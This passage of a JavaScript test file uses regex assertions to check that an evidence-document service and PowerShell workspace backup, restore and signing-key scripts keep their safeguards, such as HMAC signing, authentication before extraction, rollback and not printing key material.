  assert.match(acceptanceMigration, /JOIN `evidence_document` d ON d\.`id`=s\.`evidence_document_id`/);
  assert.match(documents, /evidenceDocumentReferences\(brief\.body_markdown, 5000\)/);
  assert.match(documents, /instr\(body_markdown,'\/api\/documents\?'\)/);
  assert.match(documents, /evidence_object_cleanup_pending/);
  assert.match(documents, /Document storage is unavailable; evidence metadata was not removed/);
  assert.match(documents, /Governed publication artifacts must be opened through their attested publication record/);
  assert.match(documents, /MAX\(rowid\)[\s\S]*auditRevision\.max_rowid/);
  assert.match(cleanup, /json_extract\(completed\.after_payload,'\$\.pendingAuditId'\)=\$\{pendingAlias\}\.id/);
  assert.match(cleanup, /MAX_EVIDENCE_CLEANUP_RETRY_BATCH = 25/);
  assert.match(cleanup, /enqueueReplacedEvidenceCleanupStatement/);
  assert.match(cleanupRoute, /requireSteward\(actor\)/);
  assert.match(diagnosticsRoute, /pendingEvidenceObjectCleanupCount\(env\.DB\)/);
  assert.match(transfer, /enqueueReplacedEvidenceCleanupStatement[\s\S]*cleanupEvidenceObjectsForWorkspaceOperation/);
  assert.doesNotMatch(transfer, /bucket\.delete\([^)]*\)\.catch\(\(\) => undefined\)/);
  assert.match(decisionServer, /EvidenceVerificationScope[\s\S]*evidenceScope\.initiativeId/);
});

test("local recovery scripts authenticate before extraction and keep trust material separate", () => {
  const common = read("scripts/local/Common-A2OWorkspace.ps1");
  const backup = read("scripts/local/Backup-A2OWorkspace.ps1");
  const restore = read("scripts/local/Restore-A2OWorkspace.ps1");
  const keyExport = read("scripts/local/Export-A2OTransferSigningKey.ps1");
  const keyImport = read("scripts/local/Import-A2OTransferSigningKey.ps1");
  const legacyTrust = read("scripts/local/Establish-A2OLegacySigningTrustRoot.ps1");
  const signingTest = read("scripts/local/Test-A2OSigningControls.ps1");
  const update = read("scripts/local/Update-A2OWorkspace.ps1");
  assert.match(common, /HMACSHA256\]::new\(\$KeyBytes\)/);
  assert.match(common, /System\.Collections\.IDictionary/);
  assert.match(common, /Write-A2OProtectedSecretTextAtomic -Path \$runtimeSecretPath/);
  assert.match(common, /Operational workspace state exists while its signing trust root is missing/);
  assert.match(common, /active-release-provenance\.json/);
  const start = read("scripts/local/Start-A2OWorkspace.ps1");
  assert.match(start, /\.a2o-secrets\/workspace-transfer\.runtime\.env/);
  assert.match(start, /\.a2o-secrets\/genai-mil\.runtime\.env/);
  assert.match(start, /--env-file/);
  assert.match(common, /unexpected or duplicate assignment/);
  assert.match(backup, /schemaVersion = 4/);
  assert.match(backup, /Get-A2OHmacSha256/);
  assert.match(backup, /ConvertTo-Json -Depth 10/);
  assert.match(backup, /partial\.zip/);
  assert.match(backup, /-ValidationOnly -PassThru/);
  assert.ok(restore.indexOf("$expectedSignature") < restore.indexOf("foreach ($record in $entryRecords)"));
  assert.doesNotMatch(restore, /ExtractToDirectory/);
  assert.match(restore, /prior state and provenance were rolled back/);
  assert.match(restore, /ValidationOnly/);
  assert.match(restore, /Add-Type -AssemblyName System\.IO\.Compression[\s\S]*Add-Type -AssemblyName System\.IO\.Compression\.FileSystem/);
  assert.match(restore, /ExpectedLegacySha256/);
  assert.match(update, /Backup-A2OWorkspace\.ps1[\s\S]*-PassThru[\s\S]*Restore-A2OWorkspace\.ps1[\s\S]*-ValidationOnly -PassThru/);
  assert.doesNotMatch(update, /Sort-Object LastWriteTimeUtc/);
  assert.match(keyExport, /ConfirmOfflineEscrow/);
  assert.match(keyImport, /ExpectedKeyId/);
  assert.match(legacyTrust, /ESTABLISH A2O LEGACY TRUST ROOT/);
  assert.match(legacyTrust, /SchemaVersion -notin @\(0,1,2\)/);
  assert.doesNotMatch(keyExport, /Write-Output.*material\.Key[^I]/);
  assert.match(signingTest, /RFC 4231 test case 1/);
  assert.match(signingTest, /provenance tampering/);
});
